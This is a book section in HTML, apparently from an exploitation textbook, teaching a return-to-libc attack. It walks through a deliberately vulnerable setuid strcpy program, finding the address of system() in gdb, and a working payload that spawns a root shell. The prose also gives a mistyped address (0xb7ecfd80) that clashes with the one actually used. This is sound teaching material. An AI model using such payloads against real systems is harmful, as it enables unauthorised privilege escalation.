<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x6b2 Returning into system()</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part155.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part157.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: justify;"><a name="bookmark143">0x6b2 Returning into system()</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">One of the simplest libc functions to return into is <span class="s31">system()</span>. As you recall, this function takes a single argument and executes that argument with /bin/sh. This function only needs a single argument, which makes it a useful target. For this example, a simple vulnerable program will be used.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">vuln.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1157.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">int main(int argc, char *argv[])</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;line-height: 107%;text-align: left;">char buffer[5]; strcpy(buffer, argv[1]); return 0;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1158.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Of course, this program must be compiled and setuid root before it’s truly vulnerable.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1159.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ gcc -o vuln vuln.c reader@hacking:~/booksrc $ sudo chown root ./vuln reader@hacking:~/booksrc $ sudo chmod u+s ./vuln reader@hacking:~/booksrc $ ls -l ./vuln</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">-rwsr-xr-x 1 root reader 6600 2007-09-30 22:43 ./vuln</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1160.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The general idea is to force the vulnerable program to spawn a shell, without executing anything on the stack, by returning into the libc function <span class="s31">system()</span>. If this function is supplied with the argument of <span class="s31">/bin/sh</span>, this should spawn a shell.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">First, the location of the <span class="s31">system() </span>function in libc must be determined. This will be different for every system, but once the location is known, it will remain the same until libc is recompiled. One of the easiest ways to find the location of a libc function is to create a simple dummy program and debug it, like this:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1161.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ cat &gt; dummy.c int main()</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">{ system(); }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gcc -o dummy dummy.c reader@hacking:~/booksrc $ gdb -q ./dummy</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;.</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">(gdb) break main Breakpoint 1 at 0x804837a (gdb) run</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/matrix/booksrc/dummy</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1, 0x0804837a in main () (gdb) print system</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">$1 = {&lt;text variable, no debug info&gt;} 0xb7ed0d80 &lt;system&gt; (gdb) quit</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1162.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Here, a dummy program is created that uses the <span class="s31">system() </span>function. After it’s compiled, the binary is opened in a debugger and a breakpoint is set at the beginning. The program is executed, and then the location of the <span class="s31">system() </span>function is displayed. In this case, the <span class="s31">system() </span>function is located at <span class="s31">0xb7ed0d80</span>.</p><p style="text-indent: 0pt;text-align: left;"><span><img width="175" height="23" alt="image" src="Image_1163.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="1" height="7" alt="image" src="Image_1164.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="1" height="7" alt="image" src="Image_1165.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="1" height="7" alt="image" src="Image_1166.png"/></span></p><p class="s99" style="padding-left: 12pt;text-indent: 0pt;text-align: left;">Argument 1</p><p style="text-indent: 0pt;text-align: left;"/><p class="s99" style="padding-left: 7pt;text-indent: 0pt;text-align: left;">Return address</p><p style="text-indent: 0pt;text-align: left;"/><p class="s99" style="padding-left: 3pt;text-indent: 0pt;text-align: left;">Function address</p><p style="text-indent: 0pt;text-align: left;"/><p style="text-indent: 0pt;text-align: left;"><span><img width="176" height="23" alt="image" src="Image_1167.png"/></span></p><p class="s99" style="padding-left: 7pt;text-indent: 0pt;text-align: left;">Argument 3 ...</p><p style="text-indent: 0pt;text-align: left;"/><p class="s99" style="padding-left: 12pt;text-indent: 0pt;text-align: left;">Argument 2</p><p style="text-indent: 0pt;text-align: left;"/><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Armed with that knowledge, we can direct program execution into the <span class="s31">system() </span>function of libc. However, the goal here is to cause the vulnerable program to execute <span class="s31">system(&quot;/bin/sh&quot;) </span>to provide a shell, so an argument must be supplied. When returning into libc, the return address and function arguments are read off the stack in what should be a familiar format: the return address followed by the arguments. On the stack, the return-into-libc call should look something like this:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-top: 9pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Directly after the address of the desired libc function is the address to which execution should return after the libc call. After that, all of the function arguments come in sequence.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">In this case, it doesn’t really matter where the execution returns to after the libc call, since it will be opening an interactive shell. Therefore, these four bytes can just be a placeholder value of <span class="s31">FAKE</span>. There is only one argument, which should be a pointer to the string <span class="s31">/bin/sh</span>. This string can be stored anywhere in memory; an environment variable is an excellent candidate.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">In the output below, the string is prefixed with several spaces. This will act similarly to a NOP sled, providing us with some wiggle room, since <span class="s31">system(&quot; /bin/sh&quot;) </span>is the same as <span class="s31">system(&quot; /bin/sh&quot;)</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1168.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ export BINSH=&quot;     /bin/sh&quot; reader@hacking:~/booksrc $ ./getenvaddr BINSH ./vuln BINSH will be at 0xbffffe5b</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1169.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">So the <span class="s31">system() </span>address is <span class="s31">0xb7ed0d80</span>, and the address for the <span class="s31">/bin/sh </span>string will be <span class="s31">0xbffffe5b </span>when the program is executed. That means the return address on the stack should be overwritten with a series of addresses, beginning with <span class="s31">0xb7ecfd80</span>, followed by <span class="s31">FAKE </span>(since it doesn’t matter where execution goes after the <span class="s31">system() </span>call), and concluding with <span class="s31">0xbffffe5b</span>.</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">A quick binary search shows that the return address is probably over- written by the eighth word of the program input, so seven words of dummy data are used for spacing in the exploit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1170.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./vuln $(perl -e &#39;print &quot;ABCD&quot;x5&#39;) reader@hacking:~/booksrc $ ./vuln $(perl -e &#39;print &quot;ABCD&quot;x10&#39;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Segmentation fault</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./vuln $(perl -e &#39;print &quot;ABCD&quot;x8&#39;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Segmentation fault</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./vuln $(perl -e &#39;print &quot;ABCD&quot;x7&#39;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Illegal instruction</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./vuln $(perl -e &#39;print &quot;ABCD&quot;x7 . &quot;\x80\x0d\xed\xb7FAKE\x5b\xfe\ xff\xbf&quot;&#39;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">sh-3.2# whoami root</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sh-3.2#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1171.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The exploit can be expanded upon by making chained libc calls, if needed. The return address of <span class="s31">FAKE </span>used in the example can be changed to direct program execution. Additional libc calls can be made, or execution can be directed into some other useful section in the program’s existing instructions.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part157.htm">0x6c0 Randomized Stack Space</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part155.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part157.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
